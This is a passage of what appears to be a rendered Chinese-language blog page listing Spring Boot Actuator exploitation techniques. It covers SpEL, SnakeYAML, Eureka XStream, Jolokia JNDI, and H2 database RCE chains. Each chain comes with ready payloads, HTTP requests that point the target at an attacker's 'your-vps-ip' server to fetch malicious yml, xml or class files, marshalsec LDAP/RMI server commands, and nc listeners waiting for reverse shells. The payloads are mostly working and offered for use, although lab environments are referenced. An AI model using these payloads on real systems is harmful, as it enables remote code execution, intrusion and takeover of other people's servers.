+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x02：spring-cloud-SnakeYAML-RCE"><a href="#0x02：spring-cloud-SnakeYAML-RCE" class="headerlink" title="0x02：spring cloud SnakeYAML RCE"></a>0x02：spring cloud SnakeYAML RCE</h3><h4 id="利用条件：-5"><a href="#利用条件：-5" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li>
+<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
+</ul>
+<h4 id="利用方法：-5"><a href="#利用方法：-5" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-托管-yml-和-jar-文件"><a href="#步骤一：-托管-yml-和-jar-文件" class="headerlink" title="步骤一： 托管 yml 和 jar 文件"></a>步骤一： 托管 yml 和 jar 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在网站根目录下放置后缀为 <code>yml</code> 的文件  <code>example.yml</code>，内容如下：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://your-vps-ip/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在网站根目录下放置后缀为 <code>jar</code> 的文件  <code>example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a>。</p>
+<h5 id="步骤二：-设置-spring-cloud-bootstrap-location-属性"><a href="#步骤二：-设置-spring-cloud-bootstrap-location-属性" class="headerlink" title="步骤二： 设置 spring.cloud.bootstrap.location 属性"></a>步骤二： 设置 spring.cloud.bootstrap.location 属性</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.yml</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.yml&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤三：-刷新配置"><a href="#步骤三：-刷新配置" class="headerlink" title="步骤三： 刷新配置"></a>步骤三： 刷新配置</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
+<li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li>
+<li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
+<li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li>
+<li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
+<li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li>
+<li>实例化类时执行恶意代码，造成 RCE 漏洞</li>
+</ol>
+<h4 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/">Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记</a></p>
+<h4 id="漏洞环境：-1"><a href="#漏洞环境：-1" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce">repository/springcloud-snakeyaml-rce</a></p>
+<p>正常访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9092&#x2F;env</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x03：eureka-xstream-deserialization-RCE"><a href="#0x03：eureka-xstream-deserialization-RCE" class="headerlink" title="0x03：eureka xstream deserialization RCE"></a>0x03：eureka xstream deserialization RCE</h3><h4 id="利用条件：-6"><a href="#利用条件：-6" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>目标使用的  <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li>
+<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
+</ul>
+<h4 id="利用方法：-6"><a href="#利用方法：-6" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：架设响应恶意-XStream-payload-的网站"><a href="#步骤一：架设响应恶意-XStream-payload-的网站" class="headerlink" title="步骤一：架设响应恶意 XStream payload 的网站"></a>步骤一：架设响应恶意 XStream payload 的网站</h5><p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p>
+<p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p>
+<h5 id="步骤二：监听反弹-shell-的端口"><a href="#步骤二：监听反弹-shell-的端口" class="headerlink" title="步骤二：监听反弹 shell 的端口"></a>步骤二：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤三：设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#步骤三：设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="步骤三：设置 eureka.client.serviceUrl.defaultZone 属性"></a>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤四：刷新配置"><a href="#步骤四：刷新配置" class="headerlink" title="步骤四：刷新配置"></a>步骤四：刷新配置</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
+<li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li>
+<li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li>
+<li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li>
+</ol>
+<h4 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://www.freebuf.com/column/234719.html">Spring Boot Actuator从未授权访问到getshell</a></p>
+<h4 id="漏洞环境：-2"><a href="#漏洞环境：-2" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce">repository/springboot-eureka-xstream-rce</a></p>
+<p>正常访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9093&#x2F;env</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x04：jolokia-logback-JNDI-RCE"><a href="#0x04：jolokia-logback-JNDI-RCE" class="headerlink" title="0x04：jolokia logback JNDI RCE"></a>0x04：jolokia logback JNDI RCE</h3><h4 id="利用条件：-7"><a href="#利用条件：-7" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li><p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p>
+</li>
+<li><p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</p>
+</li>
+<li><p>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
+</li>
+<li><p>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过</p>
+</li>
+</ul>
+<h4 id="利用方法：-7"><a href="#利用方法：-7" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看已存在的-MBeans"><a href="#步骤一：查看已存在的-MBeans" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h5><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p>
+<h5 id="步骤二：托管-xml-文件"><a href="#步骤二：托管-xml-文件" class="headerlink" title="步骤二：托管 xml 文件"></a>步骤二：托管 xml 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code>  文件，内容如下：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;ldap://your-vps-ip:1389/JNDIObject&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤三：准备要执行的-Java-代码"><a href="#步骤三：准备要执行的-Java-代码" class="headerlink" title="步骤三：准备要执行的 Java 代码"></a>步骤三：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>，</p>
+<p>使用兼容低版本 jdk 的方式编译：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac -<span class="built_in">source</span> 1.5 -target 1.5 JNDIObject.java</span><br></pre></td></tr></table></figure>
+
+<p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
+<h5 id="步骤四：架设恶意-ldap-服务"><a href="#步骤四：架设恶意-ldap-服务" class="headerlink" title="步骤四：架设恶意 ldap 服务"></a>步骤四：架设恶意 ldap 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/<span class="comment">#JNDIObject 1389</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤五：监听反弹-shell-的端口"><a href="#步骤五：监听反弹-shell-的端口" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lv 443</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤六：从外部-URL-地址加载日志配置文件"><a href="#步骤六：从外部-URL-地址加载日志配置文件" class="headerlink" title="步骤六：从外部 URL 地址加载日志配置文件"></a>步骤六：从外部 URL 地址加载日志配置文件</h5><blockquote>
+<p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p>
+</blockquote>
+<p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;jolokia&#x2F;exec&#x2F;ch.qos.logback.classic:Name&#x3D;default,Type&#x3D;ch.qos.logback.classic.jmx.JMXConfigurator&#x2F;reloadByURL&#x2F;http:!&#x2F;!&#x2F;your-vps-ip!&#x2F;example.xml</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="漏洞原理：-3"><a href="#漏洞原理：-3" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
+<li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code>reloadByURL</code> 方法</li>
+<li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li>
+<li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
+<li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
+<li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
+</ol>
+<h4 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p>
+<h4 id="漏洞环境：-3"><a href="#漏洞环境：-3" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository/springboot-jolokia-logback-rce</a></p>
+<p>正常访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9094&#x2F;env</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x05：jolokia-Realm-JNDI-RCE"><a href="#0x05：jolokia-Realm-JNDI-RCE" class="headerlink" title="0x05：jolokia Realm JNDI RCE"></a>0x05：jolokia Realm JNDI RCE</h3><h4 id="利用条件：-8"><a href="#利用条件：-8" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
+<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
+<li>目标可以请求攻击者的服务器（请求可出外网）</li>
+<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121(RMI)，但相关环境可绕过</li>
+</ul>
+<h4 id="利用方法：-8"><a href="#利用方法：-8" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看已存在的-MBeans-1"><a href="#步骤一：查看已存在的-MBeans-1" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h5><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p>
+<h5 id="步骤二：准备要执行的-Java-代码"><a href="#步骤二：准备要执行的-Java-代码" class="headerlink" title="步骤二：准备要执行的 Java 代码"></a>步骤二：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>。</p>
+<h5 id="步骤三：托管-class-文件"><a href="#步骤三：托管-class-文件" class="headerlink" title="步骤三：托管 class 文件"></a>步骤三：托管 class 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>
+<h5 id="步骤四：架设恶意-rmi-服务"><a href="#步骤四：架设恶意-rmi-服务" class="headerlink" title="步骤四：架设恶意 rmi 服务"></a>步骤四：架设恶意 rmi 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/<span class="comment">#JNDIObject 1389</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤五：监听反弹-shell-的端口-1"><a href="#步骤五：监听反弹-shell-的端口-1" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤六：发送恶意-payload"><a href="#步骤六：发送恶意-payload" class="headerlink" title="步骤六：发送恶意 payload"></a>步骤六：发送恶意 payload</h5><p>根据实际情况修改 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p>
+<h4 id="漏洞原理：-4"><a href="#漏洞原理：-4" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
+<li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li>
+<li>设置 connectionURL 地址为 RMI Service URL</li>
+<li>设置 contextFactory 为 RegistryContextFactory</li>
+<li>停止 Realm</li>
+<li>启动 Realm 以触发指定 RMI 地址的  JNDI 注入，造成 RCE 漏洞</li>
+</ol>
+<h4 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html">Yet Another Way to Exploit Spring Boot Actuators via Jolokia</a></p>
+<h4 id="漏洞环境：-4"><a href="#漏洞环境：-4" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository/springboot-jolokia-logback-rce</a></p>
+<p>正常访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9094&#x2F;env</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x06：restart-h2-database-query-RCE"><a href="#0x06：restart-h2-database-query-RCE" class="headerlink" title="0x06：restart h2 database query RCE"></a>0x06：restart h2 database query RCE</h3><h4 id="利用条件：-9"><a href="#利用条件：-9" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
+<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
+</ul>
+<h4 id="利用方法：-9"><a href="#利用方法：-9" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：设置-spring-datasource-hikari-connection-test-query-属性"><a href="#步骤一：设置-spring-datasource-hikari-connection-test-query-属性" class="headerlink" title="步骤一：设置 spring.datasource.hikari.connection-test-query 属性"></a>步骤一：设置 spring.datasource.hikari.connection-test-query 属性</h5><blockquote>
+<p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p>
+</blockquote>
+<p>spring 1.x（无回显执行命令）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.hikari.connection-test-query&#x3D;CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#39;);CALL T5(&#39;cmd&#39;,&#39;&#x2F;c&#39;,&#39;calc&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x（无回显执行命令）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#39;);CALL T5(&#39;cmd&#39;,&#39;&#x2F;c&#39;,&#39;calc&#39;);&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤二：重启应用"><a href="#步骤二：重启应用" class="headerlink" title="步骤二：重启应用"></a>步骤二：重启应用</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="漏洞原理：-5"><a href="#漏洞原理：-5" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
+<li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li>
+<li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li>
+<li>restart 重启应用，会建立新的数据库连接</li>
+<li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li>
+</ol>
+<h4 id="漏洞分析：-5"><a href="#漏洞分析：-5" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p>
+<h4 id="漏洞环境：-5"><a href="#漏洞环境：-5" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository/springboot-h2-database-rce</a></p>
+<p>正常访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9096&#x2F;actuator&#x2F;env</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x07：h2-database-console-JNDI-RCE"><a href="#0x07：h2-database-console-JNDI-RCE" class="headerlink" title="0x07：h2 database console JNDI RCE"></a>0x07：h2 database console JNDI RCE</h3><h4 id="利用条件：-10"><a href="#利用条件：-10" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
+<li>spring 配置中启用 h2 console  <code>spring.h2.console.enabled=true</code></li>
+<li>目标可以请求攻击者的服务器（请求可出外网）</li>
+<li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）</li>
+</ul>
+<h4 id="利用方法：-10"><a href="#利用方法：-10" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：访问路由获得-jsessionid"><a href="#步骤一：访问路由获得-jsessionid" class="headerlink" title="步骤一：访问路由获得 jsessionid"></a>步骤一：访问路由获得 jsessionid</h5><p>直接访问目标开启 h2 console 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p>
+<h5 id="步骤二：准备要执行的-Java-代码-1"><a href="#步骤二：准备要执行的-Java-代码-1" class="headerlink" title="步骤二：准备要执行的 Java 代码"></a>步骤二：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>，</p>
+<p>使用兼容低版本 jdk 的方式编译：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac -<span class="built_in">source</span> 1.5 -target 1.5 JNDIObject.java</span><br></pre></td></tr></table></figure>
+
+<p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
+<h5 id="步骤三：托管-class-文件-1"><a href="#步骤三：托管-class-文件-1" class="headerlink" title="步骤三：托管 class 文件"></a>步骤三：托管 class 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>
+<h5 id="步骤四：架设恶意-ldap-服务-1"><a href="#步骤四：架设恶意-ldap-服务-1" class="headerlink" title="步骤四：架设恶意 ldap 服务"></a>步骤四：架设恶意 ldap 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/<span class="comment">#JNDIObject 1389</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤五：监听反弹-shell-的端口-2"><a href="#步骤五：监听反弹-shell-的端口-2" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lv 443</span><br></pre></td></tr></table></figure>
+
+
+
